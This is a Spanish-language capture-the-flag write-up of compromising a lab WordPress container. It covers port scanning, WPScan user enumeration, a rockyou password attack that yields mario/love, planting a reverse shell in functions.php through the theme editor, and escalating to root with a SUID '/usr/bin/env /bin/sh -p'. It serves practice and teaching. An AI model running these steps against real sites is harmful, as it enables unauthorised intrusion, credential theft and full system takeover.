# Writeup
## Recon
Comenzamos por lanzar un escaneo de puertos como de costumbre, para identificar servicios y versiones en todos los puertos abiertos mediante TCP.
```bash
nmap -p 0-65535 --open -T5 -A -sT -Pn -n 172.17.0.2 -oX nmap_TCP.xml && xsltproc nmap_TCP.xml -o nmap_TCP.html && open nmap_TCP.html &>/dev/null & disown
```
El escaneo muestra un servidor HTTP sirviendo una página en el puerto 80 y nada más a primera vista, por lo que vamos a echarle un vistazo al contenido de esta. Al visitarla solo me encuentro con la página default de Apache, así que voy a probar a lanzar un fuzzeo con ffuf en busca de directorios ocultos para ampliar un poco la superficie de ataque. Después de solo un par de segundos ffuf encuentra /wordpress.
### WordPress
En esta ruta hay poca cosa, un artículo que se encuentra en http://172.17.0.2/wordpress/index.php/pagina-ejemplo/ algún enlace muerto. Sin duda alguna se trata de un WordPress así que voy a utilizar WhatWeb para identificar la versión mientras dejo ffuf trabajando en los directorios dentro de /wordpress. El fuzzeo no encuentra nada que no me esperase, una licencia, un readme, y el panel de login de WP, por otro lado, whatweb dice que estamos ante un WordPress 6.8.2.

Investigando me encuentro con que las versiones de WP anteriores a las 6.9 que utilizan el plugin wp-file-manager son susceptibles a la ejecución arbitraria de código PHP, lo que nos podría permitir acceder al sistema mediante una reverse shell.

Utilizando WPScan veo que la página no tiene instalado el plugin en cuestión, pero probando más parámetros en wpscan encuentro un usuario: **mario**.
```bash
wpscan --url http://172.17.0.2/wordpress/ -e u

[i] User(s) Identified:

[+] mario
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://172.17.0.2/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

```
Ahora, ya sabiendo el usuario vamos a probar a lanzar un ataque diccionario.
### Ataque diccionario
En apenas unos segundos, encontramos la contraseña para el usuario **mario**
```bash
wpscan --url http://172.17.0.2/wordpress/ -U mario -P /usr/share/wordlists/rockyou.txt

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - mario / love                                                                                                              
Trying mario / love Time: 00:00:02 <                                                          > (390 / 14344783)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: mario, Password: love

```
## Exploit
### Reverse Shell
Desde dentro del panel de admin de WP, editamos desde el Theme Code Editor el archivo functions.php y le añadimos la reverse shell de Pentest Monkey, una vez hecho, refrescamos y ya estamos dentro como www-data.
## Post
Al intentar hacer sudo -l no me deja, así que instlado LinPEAS para automatizar el escalado de privilegios. Gracias a LinPEAS encuentro que el /usr/bin/env se ejecuta con privilegios de root, así que vamos a tratar de escalar a través de ese vector. Una vez llegados a este punto, es tan sencillo como ejecutar `usr/bin/env /bin/sh -p`, y ya somos root:
```bash
www-data@e7f63e892112:/$ /usr/bin/env /bin/sh -p
/usr/bin/env /bin/sh -p
whoami
root
```
